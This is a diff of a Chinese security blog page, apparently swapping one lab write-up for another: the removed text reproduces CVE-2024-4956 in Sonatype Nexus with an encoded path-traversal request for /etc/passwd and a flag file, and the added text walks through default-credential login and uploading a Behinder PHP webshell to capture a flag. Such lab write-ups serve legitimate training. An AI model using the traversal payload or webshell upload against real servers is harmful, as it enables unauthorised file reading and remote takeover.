@@ -1,19 +1,19 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="靶标介绍 Sonatype Nexus Repository 3（通常简称为Nexus3）是一个由Sonatype开发的仓库管理工具，用于管理和托管各种软件构件（如Maven构件、Docker镜像等），它提供了一种集中化的方式来存储、管理和分发软件构件，以帮助团队协作和构建自动化。\nSonatype Nexus Repository 3.0.0 - 3.68.0版本中存在路径遍历漏洞，未经身份验证的威胁者可构造恶意URL下载目标系统上的任意文件。\n">
-<title>【春秋云境】CVE-2024-4956复现</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="靶机信息 可以通过访问极核官方靶场开启靶机实验：极核靶场\u00a0-&gt; 渗透测试靶场 -&gt; 彩虹目录列表\n靶机实战 首先访问靶机首页，可以找到后台管理，说明存在后台。\n第一种获取账号密码的方式：访问题目信息给出的Github源码地址，默认账号密码已经写在README\n第二种方式可以通过对登录请求的数据包进行密码爆破。\n登录成功后返回首页，可以上传文件。\n其中从GITHUB可以得知这是个PHP程序，尝试直接上传PHP木马，这里使用冰蝎WebShell工具的WebShell木马进行上传。可以发现并未限制PHP文件的上传。\n使用冰蝎对上传的木马进行连接，可以连接成功，并且可以读取文件，读取根目录Flag文件即可获得Flag。\nflag:\n">
+<title>【极核GetShell靶场】彩虹目录列表 任意文件上传</title>
 
-<link rel='canonical' href='http://localhost:1313/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83cve-2024-4956%E5%A4%8D%E7%8E%B0/'>
+<link rel='canonical' href='http://localhost:1313/p/%E6%9E%81%E6%A0%B8getshell%E9%9D%B6%E5%9C%BA%E5%BD%A9%E8%99%B9%E7%9B%AE%E5%BD%95%E5%88%97%E8%A1%A8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/'>
 
-<link rel="stylesheet" href="/scss/style.min.ded09199e10d7e343e92a3d06815e1792f7733e4086835e30d0740e630f272ae.css"><meta property='og:title' content="【春秋云境】CVE-2024-4956复现">
-<meta property='og:description' content="靶标介绍 Sonatype Nexus Repository 3（通常简称为Nexus3）是一个由Sonatype开发的仓库管理工具，用于管理和托管各种软件构件（如Maven构件、Docker镜像等），它提供了一种集中化的方式来存储、管理和分发软件构件，以帮助团队协作和构建自动化。\nSonatype Nexus Repository 3.0.0 - 3.68.0版本中存在路径遍历漏洞，未经身份验证的威胁者可构造恶意URL下载目标系统上的任意文件。\n">
-<meta property='og:url' content='http://localhost:1313/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83cve-2024-4956%E5%A4%8D%E7%8E%B0/'>
+<link rel="stylesheet" href="/scss/style.min.ded09199e10d7e343e92a3d06815e1792f7733e4086835e30d0740e630f272ae.css"><meta property='og:title' content="【极核GetShell靶场】彩虹目录列表 任意文件上传">
+<meta property='og:description' content="靶机信息 可以通过访问极核官方靶场开启靶机实验：极核靶场\u00a0-&gt; 渗透测试靶场 -&gt; 彩虹目录列表\n靶机实战 首先访问靶机首页，可以找到后台管理，说明存在后台。\n第一种获取账号密码的方式：访问题目信息给出的Github源码地址，默认账号密码已经写在README\n第二种方式可以通过对登录请求的数据包进行密码爆破。\n登录成功后返回首页，可以上传文件。\n其中从GITHUB可以得知这是个PHP程序，尝试直接上传PHP木马，这里使用冰蝎WebShell工具的WebShell木马进行上传。可以发现并未限制PHP文件的上传。\n使用冰蝎对上传的木马进行连接，可以连接成功，并且可以读取文件，读取根目录Flag文件即可获得Flag。\nflag:\n">
+<meta property='og:url' content='http://localhost:1313/p/%E6%9E%81%E6%A0%B8getshell%E9%9D%B6%E5%9C%BA%E5%BD%A9%E8%99%B9%E7%9B%AE%E5%BD%95%E5%88%97%E8%A1%A8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/'>
 <meta property='og:site_name' content='SlimerのBlog'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-09-19T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-09-19T00:00:00&#43;00:00'/><meta property='og:image' content='http://localhost:1313/images/81.webp' />
-<meta name="twitter:title" content="【春秋云境】CVE-2024-4956复现">
-<meta name="twitter:description" content="靶标介绍 Sonatype Nexus Repository 3（通常简称为Nexus3）是一个由Sonatype开发的仓库管理工具，用于管理和托管各种软件构件（如Maven构件、Docker镜像等），它提供了一种集中化的方式来存储、管理和分发软件构件，以帮助团队协作和构建自动化。\nSonatype Nexus Repository 3.0.0 - 3.68.0版本中存在路径遍历漏洞，未经身份验证的威胁者可构造恶意URL下载目标系统上的任意文件。\n"><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='http://localhost:1313/images/81.webp' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-09-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-09-27T00:00:00&#43;00:00'/><meta property='og:image' content='http://localhost:1313/images/87.webp' />
+<meta name="twitter:title" content="【极核GetShell靶场】彩虹目录列表 任意文件上传">
+<meta name="twitter:description" content="靶机信息 可以通过访问极核官方靶场开启靶机实验：极核靶场\u00a0-&gt; 渗透测试靶场 -&gt; 彩虹目录列表\n靶机实战 首先访问靶机首页，可以找到后台管理，说明存在后台。\n第一种获取账号密码的方式：访问题目信息给出的Github源码地址，默认账号密码已经写在README\n第二种方式可以通过对登录请求的数据包进行密码爆破。\n登录成功后返回首页，可以上传文件。\n其中从GITHUB可以得知这是个PHP程序，尝试直接上传PHP木马，这里使用冰蝎WebShell工具的WebShell木马进行上传。可以发现并未限制PHP文件的上传。\n使用冰蝎对上传的木马进行连接，可以连接成功，并且可以读取文件，读取根目录Flag文件即可获得Flag。\nflag:\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/images/87.webp' />
     <link rel="shortcut icon" href="/favicon.ico" />
 
     </head>
@@ -232,9 +232,8 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ul>
-    <li><a href="#靶标介绍">靶标介绍</a></li>
-    <li><a href="#登录靶场">登录靶场</a></li>
-    <li><a href="#思路">思路</a></li>
+    <li><a href="#靶机信息">靶机信息</a></li>
+    <li><a href="#靶机实战">靶机实战</a></li>
   </ul>
 </nav>
         </div>
@@ -249,9 +248,9 @@
     <article class="has-image main-article">
     <header class="article-header">
         <div class="article-image">
-            <a href="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83cve-2024-4956%E5%A4%8D%E7%8E%B0/">
+            <a href="/p/%E6%9E%81%E6%A0%B8getshell%E9%9D%B6%E5%9C%BA%E5%BD%A9%E8%99%B9%E7%9B%AE%E5%BD%95%E5%88%97%E8%A1%A8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
                 
-                    <img src="/images/81.webp" loading="lazy" alt="Featured image of post 【春秋云境】CVE-2024-4956复现" />
+                    <img src="/images/87.webp" loading="lazy" alt="Featured image of post 【极核GetShell靶场】彩虹目录列表 任意文件上传" />
                 
             </a>
         </div>
@@ -271,7 +270,7 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83cve-2024-4956%E5%A4%8D%E7%8E%B0/">【春秋云境】CVE-2024-4956复现</a>
+            <a href="/p/%E6%9E%81%E6%A0%B8getshell%E9%9D%B6%E5%9C%BA%E5%BD%A9%E8%99%B9%E7%9B%AE%E5%BD%95%E5%88%97%E8%A1%A8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">【极核GetShell靶场】彩虹目录列表 任意文件上传</a>
         </h2>
     
         
@@ -295,10 +294,10 @@
   <path d="M7 3v4" />
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
-</svg>2025年09月19日</time>
+</svg>2025年09月27日</time>
                 <span class="article-word-count">
                     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M14 2H6a2 2 0 0 0 -2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2 -2V8z" /><polyline points="14 2 14 8 20 8" /><line x1="16" y1="13" x2="8" y2="13" /><line x1="16" y1="17" x2="8" y2="17" /><polyline points="10 9 9 9 8 9" /></svg>
-                    文章共244字
+                    文章共298字
                 </span>
             </div>
 			
@@ -317,52 +316,32 @@
     <section class="article-content">
     
     
-    <h1 id="靶标介绍">靶标介绍</h1>
-<p>Sonatype Nexus Repository 3（通常简称为Nexus3）是一个由Sonatype开发的仓库管理工具，用于管理和托管各种软件构件（如Maven构件、Docker镜像等），它提供了一种集中化的方式来存储、管理和分发软件构件，以帮助团队协作和构建自动化。<br>
-<strong>Sonatype Nexus Repository 3.0.0 - 3.68.0</strong>版本中存在路径遍历漏洞，未经身份验证的威胁者可构造恶意URL下载目标系统上的任意文件。</p>
-<h1 id="登录靶场">登录靶场</h1>
-<p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250919151017.png" alt="image.png"><br>
-POC（少一个%2F都不行）</p>
+    <h1 id="靶机信息">靶机信息</h1>
+<p>可以通过访问极核官方靶场开启靶机实验：<a href="https://hackhub.get-shell.com/">极核靶场</a> -&gt; 渗透测试靶场 -&gt; 彩虹目录列表<br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928150921.png" alt="image.png"><br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928150943.png" alt="image.png"></p>
+<h1 id="靶机实战">靶机实战</h1>
+<p>首先访问靶机首页，可以找到后台管理，说明存在后台。<br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928151008.png" alt="image.png"><br>
+第一种获取账号密码的方式：访问题目信息给出的Github源码地址，默认账号密码已经写在README<br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928151207.png" alt="image.png"><br>
+第二种方式可以通过对登录请求的数据包进行密码爆破。<br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928151222.png" alt="image.png"><br>
+登录成功后返回首页，可以上传文件。<br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928151309.png" alt="image.png"><br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928151327.png" alt="image.png"><br>
+其中从GITHUB可以得知这是个PHP程序，尝试直接上传PHP木马，这里使用<a href="https://get-shell.com/1537.html">冰蝎WebShell工具</a>的WebShell木马进行上传。可以发现并未限制PHP文件的上传。<br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928151352.png" alt="image.png"><br>
+使用冰蝎对上传的木马进行连接，可以连接成功，并且可以读取文件，读取根目录Flag文件即可获得Flag。<br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928151439.png" alt="image.png"><br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250928151625.png" alt="image.png"><br>
+flag:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fflag
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250919151103.png" alt="image.png"><br>
-flag</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{052c8b51-0d6c-45e6-8040-85243bf3182e}
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h1 id="思路">思路</h1>
-<p>根据网上找到的poc</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="nx">GET</span> <span class="o">/%</span><span class="mi">2</span><span class="nx">f</span><span class="o">%</span><span class="mi">2</span><span class="nx">f</span><span class="o">%</span><span class="mi">2</span><span class="nx">f</span><span class="o">%</span><span class="mi">2</span><span class="nx">f</span><span class="o">%</span><span class="mi">2</span><span class="nx">f</span><span class="o">%</span><span class="mi">2</span><span class="nx">f</span><span class="o">%</span><span class="mi">2</span><span class="nx">f</span><span class="o">%</span><span class="mi">2</span><span class="nx">f</span><span class="o">%</span><span class="mi">2</span><span class="nx">f</span><span class="o">%</span><span class="mi">2</span><span class="nx">f</span><span class="o">%</span><span class="mi">2</span><span class="nx">f</span><span class="o">%</span><span class="mi">2</span><span class="nx">f</span><span class="o">%</span><span class="mi">2</span><span class="nx">f</span><span class="o">%</span><span class="mi">2</span><span class="nx">f</span><span class="o">%</span><span class="mi">2</span><span class="nx">f</span><span class="o">%</span><span class="mi">2</span><span class="nx">f</span><span class="o">%</span><span class="mi">2</span><span class="nx">f</span><span class="o">%</span><span class="mi">2</span><span class="nx">f</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">f</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">f</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">f</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">f</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">f</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">f</span><span class="p">..</span><span class="o">%</span><span class="mi">2</span><span class="nx">f</span><span class="p">..</span><span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">passwd</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
-</span></span><span class="line"><span class="cl"><span class="nx">Host</span><span class="p">:</span> <span class="nx">localhost</span>
-</span></span><span class="line"><span class="cl"><span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="p">:</span> <span class="nx">gzip</span><span class="p">,</span> <span class="nx">deflate</span><span class="p">,</span> <span class="nx">br</span>
-</span></span><span class="line"><span class="cl"><span class="nx">Accept</span><span class="p">:</span> <span class="o">*/*</span>
-</span></span><span class="line"><span class="cl"><span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="p">:</span> <span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">;</span><span class="nx">q</span><span class="p">=</span><span class="mf">0.9</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="p">=</span><span class="mf">0.8</span>
-</span></span><span class="line"><span class="cl"><span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="p">:</span> <span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="nx">Windows</span> <span class="nx">NT</span> <span class="mf">10.0</span><span class="p">;</span> <span class="nx">Win64</span><span class="p">;</span> <span class="nx">x64</span><span class="p">)</span> <span class="nx">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="nx">KHTML</span><span class="p">,</span> <span class="nx">like</span> <span class="nx">Gecko</span><span class="p">)</span> <span class="nx">Chrome</span><span class="o">/</span><span class="mf">119.0.6045.159</span> <span class="nx">Safari</span><span class="o">/</span><span class="mf">537.36</span>
-</span></span><span class="line"><span class="cl"><span class="nx">Connection</span><span class="p">:</span> <span class="nx">close</span>
-</span></span><span class="line"><span class="cl"><span class="nx">Cache</span><span class="o">-</span><span class="nx">Control</span><span class="p">:</span> <span class="nx">max</span><span class="o">-</span><span class="nx">age</span><span class="p">=</span><span class="mi">0</span>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GetShell{Hanasaki-amenmachi}
 </span></span></code></pre></td></tr></table>
 </div>
 </div>
@@ -408,18 +387,18 @@ flag</p>
             
                 
 <article class="has-image">
-    <a href="/p/%E6%9E%81%E6%A0%B8getshell%E9%9D%B6%E5%9C%BA%E5%BD%A9%E8%99%B9%E7%9B%AE%E5%BD%95%E5%88%97%E8%A1%A8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+    <a href="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83cve-2024-4956%E5%A4%8D%E7%8E%B0/">
         
         
             <div class="article-image">
                 
-                    <img src="/images/87.webp" loading="lazy" data-key="" data-hash="/images/87.webp"/>
+                    <img src="/images/81.webp" loading="lazy" data-key="" data-hash="/images/81.webp"/>
                 
             </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">【极核GetShell靶场】彩虹目录列表 任意文件上传</h2>
+            <h2 class="article-title">【春秋云境】CVE-2024-4956复现</h2>
         </div>
     </a>
 </article>
